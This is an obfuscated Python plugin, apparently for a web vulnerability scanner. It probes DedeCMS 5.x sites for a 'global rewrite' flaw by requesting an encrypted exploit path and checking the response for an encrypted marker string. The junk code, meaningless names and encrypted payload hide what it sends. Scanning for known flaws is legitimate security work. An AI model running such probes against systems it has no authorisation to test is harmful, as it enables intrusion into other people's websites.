# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'ef632082c7620cf54876da74a1660bfb9c06eb94549b5f3bca646474000d0c46'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: dedecms_5.x_global_rewrite.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''dedecms''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, oo, i1iII1IiiIiI1, oo, oo = curl.curl(o0OO00 + decode('\x9bTQ\xb4\xbdP~\xa29\x01\xac\x02\xd6Q\x1c\x8f\xabw\xfc\xac`\xa3\x00T\xe2\x03\r^mn*!\xce\x03\x06\xeb\xa9\x0f}\xc6;\x19\xe8E\x96\x16}\x89\xf2X\xb3'))
    if i1iII1IiiIiI1 and i1iII1IiiIiI1.find(decode("\xcd\x11\x12\xf0\xa6\x04e\xe5*O\xe3\x03\x98v`\x8b\xa51\x9f\xa3'\xcb")) != -1:
        security_hole(o0OO00)
        if 0:
            ooOoO0O00 * IIiIiII11i


if __name__ == '__main__':
    from dummy import *

#KEY---ef632082c7620cf54876da74a1660bfb9c06eb94549b5f3bca646474000d0c46---